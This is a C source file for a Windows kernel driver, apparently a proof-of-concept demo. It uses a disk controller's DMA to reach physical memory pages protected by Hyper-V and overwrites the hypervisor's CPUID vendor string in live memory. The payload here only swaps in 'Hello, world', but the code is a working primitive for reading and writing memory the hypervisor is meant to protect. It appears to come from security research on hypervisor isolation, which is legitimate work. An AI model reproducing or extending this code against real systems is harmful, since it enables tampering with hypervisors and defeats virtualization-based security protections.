#include <ntifs.h>

#include "disk.h"
#include <intrin.h>

#define printf(fmt, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, fmt, ##__VA_ARGS__)
#define CPUID_HV_VENDOR_LEAF (0x40000000)

static BOOLEAN IsMicrosoftHvRunning(VOID) {
    INT32 info[4] = {0};
    __cpuid(info, CPUID_HV_VENDOR_LEAF);
    return info[1] == 'rciM' && info[2] == 'foso' && info[3] == 'vH t';
}

static VOID PrintHvVendor(VOID) {
    INT32 info[4];
    __cpuid(info, CPUID_HV_VENDOR_LEAF);

    CHAR vendor[13] = {0};

    for (UINT32 i = 0; i < 3; ++i) {
        ((PINT32)&vendor)[i] = info[i + 1];
    }

    printf("HV vendor: %s\n", vendor);
}

static BOOLEAN IsPageAllOnes(IN PVOID page) {
    for (UINT32 i = 0; i < PAGE_SIZE; i += sizeof(UINT64)) {
        if (*(PUINT64)((PUINT8)page + i) != MAXUINT64) {
            return FALSE;
        }
    }

    return TRUE;
}

static BOOLEAN Replace4Byte(IN PVOID page, IN UINT32 value, IN UINT32 replace) {
    for (UINT32 i = 0; i <= PAGE_SIZE - sizeof(UINT32); ++i) {
        PUINT32 ptr = (PUINT32)((PUINT8)page + i);
        if (*ptr == value) {
            *ptr = replace;
            return TRUE;
        }
    }

    return FALSE;
}

static BOOLEAN ScanRange(IN PDISK disk, IN PVOID buffer, IN UINT64 base, IN UINT64 size) {
    for (UINT64 i = 0; i < size; i += PAGE_SIZE) {
        UINT64 pfn = (base + i) >> PAGE_SHIFT;

        MM_COPY_ADDRESS src;
        src.PhysicalAddress.QuadPart = pfn << PAGE_SHIFT;

        SIZE_T outSize;
        if (!NT_SUCCESS(MmCopyMemory(buffer, src, PAGE_SIZE, MM_COPY_MEMORY_PHYSICAL, &outSize))) {
            continue;
        }

        // Hyper-V pages are redirected to one with all FFs
        if (!IsPageAllOnes(buffer)) {
            continue;
        }

        PVOID mapping = MmMapIoSpace(src.PhysicalAddress, PAGE_SIZE, MmNonCached);
        if (!mapping) {
            continue;
        }

        if (!NT_SUCCESS(DiskCopy(disk, buffer, mapping))) {
            MmUnmapIoSpace(mapping, PAGE_SIZE);
            continue;
        }

        // Find and replace "Microsoft Hv" vendor string with "Hello, world"
        if (!Replace4Byte(buffer, 'rciM', 'lleH') || !Replace4Byte(buffer, 'foso', 'w ,o') ||
            !Replace4Byte(buffer, 'vH t', 'dlro')) {

            MmUnmapIoSpace(mapping, PAGE_SIZE);
            continue;
        }

        PrintHvVendor();
        printf("Found HV vendor string on page 0x%llX\n", pfn);

        // Write the modified page back
        DiskCopy(disk, mapping, buffer);

        PrintHvVendor();
        MmUnmapIoSpace(mapping, PAGE_SIZE);
        return TRUE;
    }

    return FALSE;
}

static VOID MicrosoftHvDemo(IN PDISK disk) {
    if (!IsMicrosoftHvRunning()) {
        printf("Microsoft HV is not running\n");
        return;
    }

    PHYSICAL_ADDRESS highest;
    highest.QuadPart = MAXULONG32;

    PVOID buffer = MmAllocateContiguousMemory(PAGE_SIZE, highest);
    if (!buffer) {
        printf("Failed to allocate buffer\n");
        return;
    }

    PPHYSICAL_MEMORY_RANGE ranges = MmGetPhysicalMemoryRanges();
    if (ranges) {
        PPHYSICAL_MEMORY_RANGE range = ranges;
        while (range->BaseAddress.QuadPart) {
            if (ScanRange(disk, buffer, range->BaseAddress.QuadPart,
                          range->NumberOfBytes.QuadPart)) {

                break;
            }

            ++range;
        }

        ExFreePool(ranges);
    } else {
        printf("Failed to get physical memory ranges\n");
    }

    MmFreeContiguousMemory(buffer);
}

static VOID DriverUnload(IN PDRIVER_OBJECT driver) {
    UNREFERENCED_PARAMETER(driver);
}

NTSTATUS DriverEntry(IN OUT PDRIVER_OBJECT driver, IN OUT PUNICODE_STRING registryPath) {
    UNREFERENCED_PARAMETER(registryPath);

    driver->DriverUnload = DriverUnload;

    PDISK disk;
    NTSTATUS status = DiskFind(&disk);
    if (!NT_SUCCESS(status)) {
        printf("Failed to find a supported disk for DMA: 0x%X\n", status);
        return STATUS_NOT_FOUND;
    }

    MicrosoftHvDemo(disk);

    DiskFree(disk);
    return STATUS_SUCCESS;
}